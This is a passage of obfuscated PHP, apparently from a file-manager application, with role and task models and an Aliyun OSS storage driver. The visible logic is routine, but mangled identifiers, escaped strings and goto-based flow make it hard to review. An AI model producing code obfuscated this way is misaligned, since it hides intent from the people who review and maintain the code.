$éÆÈ¸»ı[606], 0)) { $¸Ó´¾ã = $GLOBALS[$éÆÈ¸»ı[6]][$éÆÈ¸»ı[92]][$éÆÈ¸»ı[607]]; if ($¿œ‡ä¤[$éÆÈ¸»ı[539]][$éÆÈ¸»ı[608]] <= time() - $¸Ó´¾ã) { $this->metaSet($¿œ‡ä¤[$éÆÈ¸»ı[193]], $éÆÈ¸»ı[609], null); $this->metaSet($¿œ‡ä¤[$éÆÈ¸»ı[193]], $éÆÈ¸»ı[608], null); unset($¿œ‡ä¤[$éÆÈ¸»ı[539]][$éÆÈ¸»ı[609]]); continue; } $Ìùş›Æ = $¿œ‡ä¤[$éÆÈ¸»ı[539]][$éÆÈ¸»ı[609]]; $¿œ‡ä¤[$éÆÈ¸»ı[539]][$éÆÈ¸»ı[610]] = Model($éÆÈ¸»ı[598])->getInfoSimpleOuter($Ìùş›Æ); } } unset($¿œ‡ä¤); } public function parentLevelArray($®õÊ÷Šó) { $§€€ò£« =& $_SERVER[²Ö÷öõ]; $®õÊ÷Šó = explode($§€€ò£«[50], trim($®õÊ÷Šó, $§€€ò£«[50])); return array_remove_value($®õÊ÷Šó, $§€€ò£«[228]); } public function listAll($†‘ûÏÀÍ) { $éİÚ«Ãš =& $_SERVER[²Ö÷öõ]; $­ˆÓ¿êç = $this->sourceInfo($†‘ûÏÀÍ); $ôáÒ’Ä¨ = array($éİÚ«Ãš[611] => array($éİÚ«Ãš[612], $­ˆÓ¿êç[$éİÚ«Ãš[584]] . $†‘ûÏÀÍ . $éİÚ«Ãš[613]), $éİÚ«Ãš[614] => 0); $Ä›Úƒâõ = $éİÚ«Ãš[615]; $ıîÊ­¢Ü = "\114\x45\x46\124\40\x4a\x4f\x49\116\x20{$this->tablePrefix}\151\157\x5f\x66\x69\154\145\x20\x66\x69\x6c\145\x20\x6f\x6e\x20\x73\157\x75\x72\143\x65\x2e\x66\151\x6c\145\x49\x44\40\x3d\40\x66\x69\154\x65\x2e\146\x69\154\145\x49\x44"; $Ú‚ˆÃ˜ì = $this->alias($éİÚ«Ãš[519])->field($Ä›Úƒâõ)->where($ôáÒ’Ä¨)->join($ıîÊ­¢Ü)->select(); $this->_listAppendAuth($Ú‚ˆÃ˜ì); $this->_listAppendUser($Ú‚ˆÃ˜ì); $this->_listAppendPath($Ú‚ˆÃ˜ì); $Ú‚ˆÃ˜ì = array_to_keyvalue($Ú‚ˆÃ˜ì, $éİÚ«Ãš[193]); $””è³·½ = "\x2f{$­ˆÓ¿êç[$éİÚ«Ãš[32]]}\57"; $””è³·½ = $””è³·½ == $éİÚ«Ãš[592] ? $éİÚ«Ãš[8] : $””è³·½; $òäÒ¢Æ÷ = array(); foreach ($Ú‚ˆÃ˜ì as $•È‰éÃØ => $ˆßÉÛ«ƒ) { $ÀÓÑ€ª‡ = $this->parentLevelArray($ˆßÉÛ«ƒ[$éİÚ«Ãš[584]]); array_shift($ÀÓÑ€ª‡); $€¾¾•¥ = $””è³·½; for ($ù‰ôØ½¶ = 0; $ù‰ôØ½¶ < count($ÀÓÑ€ª‡); $ù‰ôØ½¶++) { $€¾¾•¥ .= $Ú‚ˆÃ˜ì[$ÀÓÑ€ª‡[$ù‰ôØ½¶]][$éİÚ«Ãš[32]] . $éİÚ«Ãš[8]; } $€¾¾•¥ .= $ˆßÉÛ«ƒ[$éİÚ«Ãš[32]]; if ($ˆßÉÛ«ƒ[$éİÚ«Ãš[485]]) { $€¾¾•¥ .= $éİÚ«Ãš[8]; } $Òó‡”È = array($éİÚ«Ãš[495] => str_replace($éİÚ«Ãš[592], $éİÚ«Ãš[8], str_replace($éİÚ«Ãš[592], $éİÚ«Ãš[8], str_replace($éİÚ«Ãš[592], $éİÚ«Ãš[8], $€¾¾•¥))), $éİÚ«Ãš[616] => intval($ˆßÉÛ«ƒ[$éİÚ«Ãš[485]]), $éİÚ«Ãš[617] => intval($ˆßÉÛ«ƒ[$éİÚ«Ãš[79]]), $éİÚ«Ãš[88] => intval($ˆßÉÛ«ƒ[$éİÚ«Ãš[88]]), $éİÚ«Ãš[90] => $this->pathInfoFilter($ˆßÉÛ«ƒ)); if (!$Òó‡”È[$éİÚ«Ãš[485]]) { $Òó‡”È[$éİÚ«Ãš[541]] = $ˆßÉÛ«ƒ[$éİÚ«Ãš[541]]; } $òäÒ¢Æ÷[] = $Òó‡”È; } $òäÒ¢Æ÷ = array_sort_by($òäÒ¢Æ÷, $éİÚ«Ãš[87]); return $òäÒ¢Æ÷; } } goto f¼øÒÛóíÙ; C‚¯£Ö¿‰ˆ: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\x2e\162\x6f\154\145\114\151\163\164"; public $field = array("\x6e\141\155\x65", "\x61\165\164\x68", "\x6c\141\x62\145\154", "\x64\151\x73\160\x6c\x61\171", "\x73\x79\163\164\145\155", "\144\145\163\143", "\151\x67\x6e\157\x72\145\x45\x78\x74", "\151\147\x6e\x6f\x72\x65\106\151\154\145\123\151\x7a\x65", "\141\x64\x6d\151\156\151\x73\x74\162\141\164\x6f\162", "\163\x6f\162\x74"); public function listData($°÷²ßö¥ = false, $†öòæ¿á = "\x73\157\x72\164", $®ÄÒ„éÊ = false) { $êâ—· =& $_SERVER[²Ö÷öõ]; $ıèù¾º  = parent::listData($°÷²ßö¥, $†öòæ¿á, $®ÄÒ„éÊ); if (!$°÷²ßö¥) { foreach ($ıèù¾º  as $Šğ°›Ì² => $ÖÎàûé½) { if ($ÖÎàûé½[$êâ—·[2187]] == 1) { $ıèù¾º [$Šğ°›Ì²][$êâ—·[526]] = LNG($êâ—·[2448]); } } } return $ıèù¾º ; } public function update($¯¤Şäï‰, $Ñü§¼½) { $ö™¢åˆ§ =& $_SERVER[²Ö÷öõ]; $Š¥¬ù«ü = parent::listData($¯¤Şäï‰); $†¸¨ª»¢ = $this->findByName($Ñü§¼½[$ö™¢åˆ§[32]]); if (!$Š¥¬ù«ü || $†¸¨ª»¢ && $†¸¨ª»¢[$ö™¢åˆ§[475]] != $Š¥¬ù«ü[$ö™¢åˆ§[475]]) { return !1; } if ($†¸¨ª»¢[$ö™¢åˆ§[2187]] == 1) { $Ñü§¼½ = array($ö™¢åˆ§[32] => $Ñü§¼½[$ö™¢åˆ§[32]], $ö™¢åˆ§[2003] => $Ñü§¼½[$ö™¢åˆ§[2003]]); } $this->filterAuth($Ñü§¼½[$ö™¢åˆ§[487]]); return parent::update($¯¤Şäï‰, $Ñü§¼½); } public function remove($ÂéÌÍ¡à) { $Òï™¾ë = parent::listData($ÂéÌÍ¡à); if (!$Òï™¾ë || $Òï™¾ë[$_SERVER[²Ö÷öõ][191]]) { return !1; } return parent::remove($ÂéÌÍ¡à); } public function add($èŞí«ù¤) { $‰šßÉ¡ =& $_SERVER[²Ö÷öõ]; $ ÕÏ‘…Ÿ = $èŞí«ù¤[$‰šßÉ¡[32]]; if ($this->findByName($ ÕÏ‘…Ÿ)) { return !1; } $‚åìÏ™¬ = array($‰šßÉ¡[494] => $ ÕÏ‘…Ÿ, $‰šßÉ¡[1986] => $‰šßÉ¡[12], $‰šßÉ¡[1982] => $‰šßÉ¡[1990], $‰šßÉ¡[2449] => 1, $‰šßÉ¡[1985] => 0, $‰šßÉ¡[2450] => 0, $‰šßÉ¡[1984] => $this->getSort()); $èŞí«ù¤ = array_merge($‚åìÏ™¬, $èŞí«ù¤); $this->filterAuth($èŞí«ù¤[$‰šßÉ¡[487]]); return parent::insert($èŞí«ù¤); } private function getSort() { $³…›ã‹ =& $_SERVER[²Ö÷öõ]; $öƒ¢±Ãš = parent::listData(); $Ã©Ö¹©Ş = array_to_keyvalue($öƒ¢±Ãš, $³…›ã‹[12], $³…›ã‹[2004]); return empty($Ã©Ö¹©Ş) ? 0 : max($Ã©Ö¹©Ş) + 1; } private function filterAuth(&$é‡œ„×) { $†¥šúî… =& $_SERVER[²Ö÷öõ]; $ÅÇ‚Ú¾“ = array(); $éäÙèÃß = array_filter(explode($†¥šúî…[50], $é‡œ„×)); foreach ($éäÙèÃß as $é‡œ„×) { $ë‘ö£²ú = explode($†¥šúî…[10], $é‡œ„×); if ($ë‘ö£²ú[0] == $†¥šúî…[2451] && $ë‘ö£²ú[1] != $†¥šúî…[1283]) { $²ò’½ƒ£ = $ë‘ö£²ú[0] . $†¥šúî…[10] . $ë‘ö£²ú[1] . $†¥šúî…[2452]; if (!in_array($²ò’½ƒ£, $éäÙèÃß)) { $ÅÇ‚Ú¾“[] = $²ò’½ƒ£; } } $ÅÇ‚Ú¾“[] = $é‡œ„×; } $é‡œ„× = implode($†¥šúî…[50], $ÅÇ‚Ú¾“); } public function findRoleDefault() { $¼”ıâ†Ò =& $_SERVER[²Ö÷öõ]; $åƒß†ç = parent::listData(); $ÒŸğÁê¦ = !1; foreach ($åƒß†ç as $ú«ÕºïÆ) { if (!$ú«ÕºïÆ || $ú«ÕºïÆ[$¼”ıâ†Ò[2002]] == $¼”ıâ†Ò[228] || $ú«ÕºïÆ[$¼”ıâ†Ò[2187]] == 1) { continue; } if (strstr($ú«ÕºïÆ[$¼”ıâ†Ò[487]], $¼”ıâ†Ò[2453])) { continue; } if (!strstr($ú«ÕºïÆ[$¼”ıâ†Ò[487]], $¼”ıâ†Ò[2454])) { continue; } if (!$ÒŸğÁê¦) { $ÒŸğÁê¦ = $ú«ÕºïÆ; continue; } $ŸÍ÷®Ö° = explode($¼”ıâ†Ò[50], $ÒŸğÁê¦[$¼”ıâ†Ò[487]]); $¦Å®¼« = explode($¼”ıâ†Ò[50], $ú«ÕºïÆ[$¼”ıâ†Ò[487]]); if (count($ŸÍ÷®Ö°) > count($¦Å®¼«)) { $ÒŸğÁê¦ = $ú«ÕºïÆ; } } return $ÒŸğÁê¦ ? $ÒŸğÁê¦[$¼”ıâ†Ò[475]] : $¼”ıâ†Ò[12]; } public function sort($ŸªĞæ…Ü, $ªğŸïûŠ) { return parent::update($ŸªĞæ…Ü, $ªğŸïûŠ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\x6d\x2e\164\141\163\x6b\x4c\x69\x73\164"; public $field = array("\x6e\x61\x6d\145", "\x74\x79\160\x65", "\145\x76\145\x6e\x74", "\x74\151\155\145", "\144\x65\x73\x63", "\x73\171\163\x74\145\x6d", "\x65\x6e\141\x62\154\x65", "\x6c\x61\x73\x74\x52\x75\x6e", "\x73\x6f\x72\164"); public function listData($¬êÛâµ = false, $‘íÒ¥ª = "\163\x6f\162\164", $’ˆúË¸ = false) { return parent::listData($¬êÛâµ, $‘íÒ¥ª, $’ˆúË¸); } public function add($£“’¼½Ë) { $—å‹ªÓ =& $_SERVER[²Ö÷öõ]; $¨™–—™ê = $this->findByName($£“’¼½Ë[$—å‹ªÓ[32]]); if ($¨™–—™ê) { return !1; } $£“’¼½Ë[$—å‹ªÓ[1731]] = 0; $£“’¼½Ë[$—å‹ªÓ[2004]] = $this->getSort(); return parent::insert($£“’¼½Ë); } private function getSort() { $¥ï¶ùœ¥ =& $_SERVER[²Ö÷öõ]; $¦õêÅƒñ = parent::listData(); $ò•ÍÉÔı = array_to_keyvalue($¦õêÅƒñ, $¥ï¶ùœ¥[12], $¥ï¶ùœ¥[2004]); return empty($ò•ÍÉÔı) ? 0 : max($ò•ÍÉÔı) + 1; } public function update($ß×ÑüÚ, $â¢ŞŞ€‘) { $­³ïãºÈ =& $_SERVER[²Ö÷öõ]; $’ã×Â´È = $this->listData($ß×ÑüÚ); $×éµÂÑ† = $this->findByName($â¢ŞŞ€‘[$­³ïãºÈ[32]]); if (!$’ã×Â´È || $×éµÂÑ† && $×éµÂÑ†[$­³ïãºÈ[475]] != $’ã×Â´È[$­³ïãºÈ[475]]) { return !1; } return parent::update($ß×ÑüÚ, $â¢ŞŞ€‘); } public function remove($ˆËì‚Œ¿, $¹ùåÄÃá = false) { $¥¦Ïûæ· =& $_SERVER[²Ö÷öõ]; $ªµ™İ÷· = $this->listData($ˆËì‚Œ¿); if (!$ªµ™İ÷·) { return; } if (!$¹ùåÄÃá && $ªµ™İ÷·[$¥¦Ïûæ·[191]] == $¥¦Ïûæ·[91]) { return !1; } return parent::remove($ˆËì‚Œ¿); } public function enable($ÕãóÃ¬µ, $­ÁÔ¼œû) { return $this->update($ÕãóÃ¬µ, array($_SERVER[²Ö÷öõ][2443] => $­ÁÔ¼œû)); } public function run($¨Ì˜ïİ³) { return $this->update($¨Ì˜ïİ³, array($_SERVER[²Ö÷öõ][2455] => time())); } } goto dæÆä…®–›; BÚÁÜÉˆ: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($å‡”Ëï‡) { parent::__construct(); include_once SDK_DIR . $_SERVER[²Ö÷öõ][1470]; $this->_init($å‡”Ëï‡); } public function _init($‰İÇ¯‹™) { $Ô´Í±Éï =& $_SERVER[²Ö÷öõ]; $this->config = $‰İÇ¯‹™; foreach ($‰İÇ¯‹™ as $Ğ±ƒÑºù => $³´ùÄÃ) { if (isset($this->{$Ğ±ƒÑºù})) { $this->{$Ğ±ƒÑºù} = $³´ùÄÃ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Ô´Í±Éï[1471] . LNG($Ô´Í±Éï[1472])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $Ã™ê•İ =& $_SERVER[²Ö÷öõ]; $Í½øµŸÕ = new OSS\Model\CorsConfig(); $¿ç£œ²ì = new OSS\Model\CorsRule(); $¿ç£œ²ì->addAllowedOrigin($Ã™ê•İ[1473]); $¿ç£œ²ì->addAllowedMethod($Ã™ê•İ[1474]); $¿ç£œ²ì->addAllowedMethod($Ã™ê•İ[1475]); $¿ç£œ²ì->addAllowedMethod($Ã™ê•İ[1476]); $¿ç£œ²ì->addAllowedMethod($Ã™ê•İ[1477]); $¿ç£œ²ì->addAllowedMethod($Ã™ê•İ[165]); $¿ç£œ²ì->setMaxAgeSeconds(600); $¿ç£œ²ì->addExposeHeader($Ã™ê•İ[1478]); $¿ç£œ²ì->addAllowedHeader($Ã™ê•İ[1473]); $Í½øµŸÕ->addRule($¿ç£œ²ì); try { $this->client->putBucketCors($this->bucket, $Í½øµŸÕ); } catch (OSS\Core\OssException $ö™êê‰á) { $this->writeLog(__FUNCTION__ . $Ã™ê•İ[214] . $ö™êê‰á->getMessage()); return !1; } return !0; } public function getBucketCors() { $½Ëƒ÷ë« =& $_SERVER[²Ö÷öõ]; $» İÃÁÂ = null; try { $» İÃÁÂ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $¥¹·¯äª) { $this->writeLog(__FUNCTION__ . $½Ëƒ÷ë«[214] . $¥¹·¯äª->getMessage()); return null; } if (!$» İÃÁÂ || !($ ÊÚ´»¥ = $» İÃÁÂ->getRules())) { return null; } $á‘ú„®† = $ ÊÚ´»¥[0]->getAllowedOrigins(); $ºãª£»ı = $ ÊÚ´»¥[0]->getAllowedMethods(); $ı ”öö© = $ ÊÚ´»¥[0]->getMaxAgeSeconds(); $¥âíó‚ = $ ÊÚ´»¥[0]->getExposeHeaders(); $í†¨ò¿µ = $ ÊÚ´»¥[0]->getAllowedHeaders(); return array($½Ëƒ÷ë«[218] => isset($á‘ú„®†[0]) ? $á‘ú„®†[0] : $½Ëƒ÷ë«[12], $½Ëƒ÷ë«[222] => $ºãª£»ı, $½Ëƒ÷ë«[1479] => $ı ”öö©, $½Ëƒ÷ë«[1480] => isset($¥âíó‚[0]) ? $¥âíó‚[0] : $½Ëƒ÷ë«[12], $½Ëƒ÷ë«[219] => isset($í†¨ò¿µ[0]) ? $í†¨ò¿µ[0] : $½Ëƒ÷ë«[12]); } public function isBucketCors() { $İŠƒÄÖ¾ =& $_SERVER[²Ö÷öõ]; $¦Ğ¾ƒ™ = $this->getBucketCors(); if (!$¦Ğ¾ƒ™ || !is_array($¦Ğ¾ƒ™)) { return !1; } if ($¦Ğ¾ƒ™[$İŠƒÄÖ¾[218]] != $İŠƒÄÖ¾[220] || $¦Ğ¾ƒ™[$İŠƒÄÖ¾[219]] != $İŠƒÄÖ¾[220]) { return !1; } $í‘ù¾æ§ = array_map($İŠƒÄÖ¾[221], $¦Ğ¾ƒ™[$İŠƒÄÖ¾[222]]); if (!is_array($í‘ù¾æ§)) { $í‘ù¾æ§ = array(); } $¦£Ãë±Â = array($İŠƒÄÖ¾[223], $İŠƒÄÖ¾[224], $İŠƒÄÖ¾[225], $İŠƒÄÖ¾[226], $İŠƒÄÖ¾[227]); $¸œÎíñ = array_diff($¦£Ãë±Â, $í‘ù¾æ§); return empty($¸œÎíñ); } public function mkfile($Ø¸Şûú, $âšäğğË = '', $ôıëğÃ = REPEAT_RENAME) { $ª¨ãùÑ¨ = $this->setContent($Ø¸Şûú, $âšäğğË); if ($ª¨ãùÑ¨ !== !1) { return $this->getPathOuter($Ø¸Şûú); } return !1; } public function mkdir($‹‹ä¡, $ˆ«ğËÆ– = REPEAT_SKIP) { if ($ˆ«ğËÆ– && $this->_isFolder($‹‹ä¡)) { return $this->getPathOuter($‹‹ä¡); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($‹‹ä¡)); } catch (OSS\Core\OssException $˜ÌóŞÉ…) { $this->writeLog(__FUNCTION__ . $_SERVER[²Ö÷öõ][214] . $˜ÌóŞÉ…->getMessage()); return !1; } return $this->getPathOuter($‹‹ä¡); } private function fileList($Õ›ƒ•¡ø, $†Æµ„“‰ = '', $Ğ„Ü Âœ = 0) { $…†îƒÎ =& $_SERVER[²Ö÷öõ]; $Õ›ƒ•¡ø = trim($Õ›ƒ•¡ø, $…†îƒÎ[8]); $ğ­¿†‡Ò = empty($Õ›ƒ•¡ø) && $Õ›ƒ•¡ø !== $…†îƒÎ[228] ? $…†îƒÎ[12] : $Õ›ƒ•¡ø . $…†îƒÎ[8]; $Î×£Õùñ = $…†îƒÎ[12]; $Ëûúºãş = 1000; $Êù–æ‡Í = $ÖâáÍµ = array(); while (!0) { check_abort(); $«æÂâç = array($…†îƒÎ[1481] => $†Æµ„“‰, $…†îƒÎ[1482] => $ğ­¿†‡Ò, $…†îƒÎ[1483] => $Ëûúºãş, $…†îƒÎ[1484] => $Î×£Õùñ); try { $¾¾ªªŞ¢ = $this->client->listObjects($this->bucket, $«æÂâç); } catch (OSS\Core\OssException $õÏû¡²à) { $this->writeLog(__FUNCTION__ . $…†îƒÎ[214] . $õÏû¡²à->getMessage()); break; } $Î×£Õùñ = $¾¾ªªŞ¢->getNextMarker(); $Ú´š×ğ = $¾¾ªªŞ¢->getObjectList(); $«ÓÉ†ƒÜ = $¾¾ªªŞ¢->getPrefixList(); foreach ($Ú´š×ğ as $‹’Îå¬) { if ($‹’Îå¬->getKey() == $ğ­¿†‡Ò) { continue; } $ƒ¯ÒÛÒİ = $‹’Îå¬->getKey(); $ÄœèßĞÂ = $‹’Îå¬->getSize(); $˜¶üé­¯ = $‹’Îå¬->getLastModified(); $ö®ÌÈËß = trim($‹’Îå¬->getETag(), $…†îƒÎ[121]); $ÏÚÏßÜ = $Ğ„Ü Âœ ? array($…†îƒÎ[32] => $ƒ¯ÒÛÒİ, $…†îƒÎ[79] => $ÄœèßĞÂ, $…†îƒÎ[206] => strtotime($˜¶üé­¯), $…†îƒÎ[1485] => $ö®ÌÈËß) : $ƒ¯ÒÛÒİ; $ûº®É‰  = $ÄœèßĞÂ == 0 && substr($ƒ¯ÒÛÒİ, strlen($ƒ¯ÒÛÒİ) - 1, 1) == $…†îƒÎ[8] ? !0 : !1; $Å¸Ôñ‘€ = array($…†îƒÎ[79] => $ÄœèßĞÂ, $…†îƒÎ[1486] => $ÄœèßĞÂ, $…†îƒÎ[88] => strtotime($˜¶üé­¯), $…†îƒÎ[1487] => $˜¶üé­¯, $…†îƒÎ[1485] => $ö®ÌÈËß); $this->cacheMethodInfoSet($ƒ¯ÒÛÒİ, $ûº®É‰ , $Å¸Ôñ‘€); if ($ûº®É‰ ) { $Êù–æ‡Í[] = $ƒ¯ÒÛÒİ; continue; } $ÖâáÍµ[] = $ÏÚÏßÜ; } foreach ($«ÓÉ†ƒÜ as $¥˜Ì”ß³) { $Êù–æ‡Í[] = $¥˜Ì”ß³->getPrefix(); $this->cacheMethodInfoSet($¥˜Ì”ß³->getPrefix(), !0); } if ($Î×£Õùñ === $…†îƒÎ[12]) { break; } } $this->cacheMethodInfoSet($Õ›ƒ•¡ø, !0); return array($…†îƒÎ[85] => $Êù–æ‡Í, $…†îƒÎ[86] => $ÖâáÍµ); } public function listObject($¼á¶, $İåüœ¿Œ = '') { $†’ÈõÖ€ =& $_SERVER[²Ö÷öõ]; $¼á¶ = trim($¼á¶, $†’ÈõÖ€[8]); $û… Àç„ = empty($¼á¶) && $¼á¶ !== $†’ÈõÖ€[228] ? $†’ÈõÖ€[12] : $¼á¶ . $†’ÈõÖ€[8]; $÷ÎÚ„Õ‘ = $†’ÈõÖ€[12]; $¢æƒ¿ú = 1000; $ÈÍş™ï = $¹ßÇÜé = array(); while (!0) { check_abort(); $øã‚İÄŒ = array($†’ÈõÖ€[1481] => $İåüœ¿Œ, $†’ÈõÖ€[1482] => $û… Àç„, $†’ÈõÖ€[1483] => $¢æƒ¿ú, $†’ÈõÖ€[1484] => $÷ÎÚ„Õ‘); try { $‘Äº—Í£ = $this->client->listObjects($this->bucket, $øã‚İÄŒ); } catch (OSS\Core\OssException $Íœ©±Áµ) { $this->writeLog(__FUNCTION__ . $†’ÈõÖ€[214] . $Íœ©±Áµ->getMessage()); break; } $÷ÎÚ„Õ‘ = $‘Äº—Í£->getNextMarker(); $€§–Ã¤Ï = $‘Äº—Í£->getObjectList(); foreach ($€§–Ã¤Ï as $§‹ì´Ù) { if ($§‹ì´Ù->getKey() == $û… Àç„) { continue; } $Ë„Ç¥›’ = $§‹ì´Ù->getKey(); $ã‚³Ş•ğ = $§‹ì´Ù->getSize(); $Â³ÂÁà¾ = $ã‚³Ş•ğ == 0 && substr($Ë„Ç¥›’, strlen($Ë„Ç¥›’) - 1, 1) == $†’ÈõÖ€[8] ? !0 : !1; if ($Â³ÂÁà¾) { continue; } $¹ßÇÜé[] = $ã‚³Ş•ğ . $†’ÈõÖ€[214] . $Ë„Ç¥›’; } if ($÷ÎÚ„Õ‘ === $†’ÈõÖ€[12]) { break; } } return array($†’ÈõÖ€[85] => $ÈÍş™ï, $†’ÈõÖ€[86] => $¹ßÇÜé); } public function copyFile($²³Ÿ×¶ò, $íõøèã) { $ö‚¬ÃËş = $this->size($²³Ÿ×¶ò); if ($ö‚¬ÃËş < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $²³Ÿ×¶ò, $this->bucket, $this->pathEncode($íõøèã)); } catch (OSS\Core\OssException $°Õù¼ğ) { $this->writeLog(__FUNCTION__ . $_SERVER[²Ö÷öõ][214] . $°Õù¼ğ->getMessage()); return !1; } return $this->getPathOuter($íõøèã); } $ã—á€ = $this->multiCopyObject($²³Ÿ×¶ò, $íõøèã, $ö‚¬ÃËş); return $ã—á€ ? $this->getPathOuter($íõøèã) : !1; } private function multiCopyObject($£¹ú›ø©, $šşğÂĞµ, $ó¿ŒÇšé) { $íó™«” =& $_SERVER[²Ö÷öõ]; try { $²ÏáëÅˆ = array(); if ($“§İğ¯Ò = $this->hashMd5($£¹ú›ø©)) { $²ÏáëÅˆ = array(OSS\OssClient::OSS_HEADERS => array($íó™«”[1488] => $“§İğ¯Ò)); } $µ§Ğş = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($šşğÂĞµ), $²ÏáëÅˆ); $ŠÏ¾¹Ñå = 1; $ùÁ»É–È = 0; $ÊÆà‚¹À = array(); $‚Ğ¸³úä = 1024 * 1024 * 10; $øïçÛô¬ = $this->client->generateMultiuploadParts($ó¿ŒÇšé, $‚Ğ¸³úä); foreach ($øïçÛô¬ as $˜ï”½£« => $ÆîÁáîÑ) { $§›¯–ïÓ = $ùÁ»É–È + (int) $ÆîÁáîÑ[$íó™«”[1489]]; $ˆ³àŸÕ = (int) $ÆîÁáîÑ[$íó™«”[413]] + $§›¯–ïÓ - 1; $Õù“×Á = array($íó™«”[167] => $§›¯–ïÓ, $íó™«”[168] => $ˆ³àŸÕ); $ÊÆà‚¹À[] = $this->client->uploadPartCopy($this->bucket, $£¹ú›ø©, $this->bucket, $this->pathEncode($šşğÂĞµ), $ŠÏ¾¹Ñå, $µ§Ğş, $Õù“×Á); $ŠÏ¾¹Ñå = $ŠÏ¾¹Ñå + 1; } $ÁÕ¥Ü = array(); foreach ($ÊÆà‚¹À as $˜ï”½£« => $»íÜ§©£) { $ÁÕ¥Ü[] = array($íó™«”[308] => $˜ï”½£« + 1, $íó™«”[309] => $»íÜ§©£); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($šşğÂĞµ), $µ§Ğş, $ÁÕ¥Ü); } catch (OSS\Core\OssException $ôş‹®‰™) { $this->writeLog(__FUNCTION__ . $íó™«”[214] . $ôş‹®‰™->getMessage()); return !1; } return !0; } public function moveFile($ÆòŞïİÉ, $–Üı¾å–) { if ($this->copyFile($ÆòŞïİÉ, $–Üı¾å–)) { $this->remove($ÆòŞïİÉ); return $this->getPathOuter($–Üı¾å–); } return !1; } public function delFile($¦Å–¡»‰) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($¦Å–¡»‰)); } catch (OSS\Core\OssException $º“Òã×) { $this->writeLog(__FUNCTION__ . $_SERVER[²Ö÷öõ][214] . $º“Òã×->getMessage()); return !1; } return !0; } public function delFolder($×±¢Ö¡ç) { $²åïŞ =& $_SERVER[²Ö÷öõ]; if (!$this->exist($×±¢Ö¡ç)) { return !0; } $this->listItemCache = !1; $ğ°·öĞ = $this->fileList($×±¢Ö¡ç); $this->listItemCache = !0; $ËØ ü¯ = trim($×±¢Ö¡ç, $²åïŞ[8]) . $²åïŞ[8]; if (!empty($×±¢Ö¡ç) && $×±¢Ö¡ç !== $²åïŞ[228] && !in_array($ËØ ü¯, $ğ°·öĞ[$²åïŞ[85]])) { $ğ°·öĞ[$²åïŞ[85]][] = $ËØ ü¯; } $ö§‚‚½ = $this->delByBatch($ğ°·öĞ[$²åïŞ[86]]); if (!$ö§‚‚½) { return !1; } $ö§‚‚½ = $this->delByBatch($ğ°·öĞ[$²åïŞ[85]]); if (!$ö§‚‚½) { return !1; } return $this->delFile($ËØ ü¯); } private function delByBatch($ŠîŸ™‘¡) { foreach (array_chunk($ŠîŸ™‘¡, 1000) as $ÔüÕş ª) { try { $this->client->deleteObjects($this->bucket, $ÔüÕş ª); } catch (OSS\Core\OssException $¬‡óÒ˜Ç) { $this->writeLog(__FUNCTION__ . $_SERVER[²Ö÷öõ][214] . $¬‡óÒ˜Ç->getMessage()); return !1; } } return !0; } public function rename($•€Ôµ½º, $“§¤ÄØŠ) { return $this->renameObject($•€Ôµ½º, $“§¤ÄØŠ); } private function fileInfo($æì¯¹ùî, $Èßúìüñ = false, $­ï³ÇÜÌ = array()) { $úüƒÂÔ‰ =& $_SERVER[²Ö÷öõ]; $ç÷óİ‡ = array($úüƒÂÔ‰[32] => $this->pathThis($æì¯¹ùî), $úüƒÂÔ‰[87] => $this->getPathOuter($æì¯¹ùî), $úüƒÂÔ‰[33] => $úüƒÂÔ‰[230], $úüƒÂÔ‰[79] => isset($­ï³ÇÜÌ[$úüƒÂÔ‰[79]]) ? $­ï³ÇÜÌ[$úüƒÂÔ‰[79]] : 0, $úüƒÂÔ‰[169] => $this->ext($æì¯¹ùî)); if ($Èßúìüñ) { return $ç÷óİ‡; } $ç÷óİ‡[$úüƒÂÔ‰[231]] = $ç÷óİ‡[$úüƒÂÔ‰[88]] = 0; $ç÷óİ‡[$úüƒÂÔ‰[232]] = $ç÷óİ‡[$úüƒÂÔ‰[233]] = !0; if (empty($­ï³ÇÜÌ)) { $–êÍãüË = $this->objectMeta($æì¯¹ùî); if (!$–êÍãüË) { return $ç÷óİ‡; } $­ï³ÇÜÌ = array($úüƒÂÔ‰[88] => strtotime($–êÍãüË[$úüƒÂÔ‰[1487]]), $úüƒÂÔ‰[79] => $–êÍãüË[$úüƒÂÔ‰[1486]] + 0, $úüƒÂÔ‰[1485] => $–êÍãüË[$úüƒÂÔ‰[1485]]); } if (isset($­ï³ÇÜÌ[$úüƒÂÔ‰[1485]]) && $­ï³ÇÜÌ[$úüƒÂÔ‰[1485]]) { $ç÷óİ‡[$úüƒÂÔ‰[235]] = trim($­ï³ÇÜÌ[$úüƒÂÔ‰[1485]], $úüƒÂÔ‰[121]); } if (isset($­ï³ÇÜÌ[$úüƒÂÔ‰[79]])) { $ç÷óİ‡[$úüƒÂÔ‰[79]] = $­ï³ÇÜÌ[$úüƒÂÔ‰[79]]; } if (isset($­ï³ÇÜÌ[$úüƒÂÔ‰[88]])) { $ç÷óİ‡[$úüƒÂÔ‰[88]] = $­ï³ÇÜÌ[$úüƒÂÔ‰[88]]; } if (isset($­ï³ÇÜÌ[$úüƒÂÔ‰[206]]) && !trim($ç÷óİ‡[$úüƒÂÔ‰[88]])) { $ç÷óİ‡[$úüƒÂÔ‰[88]] = $­ï³ÇÜÌ[$úüƒÂÔ‰[206]]; } return $ç÷óİ‡; } private function folderInfo($Úú¡åèâ, $ˆî‰§Ò— = false, $¿ÜÉŞ…‚ = array()) { $ìå¡Üœ =& $_SERVER[²Ö÷öõ]; $äŒÄ·‹© = array($ìå¡Üœ[32] => $this->pathThis($Úú¡åèâ), $ìå¡Üœ[87] 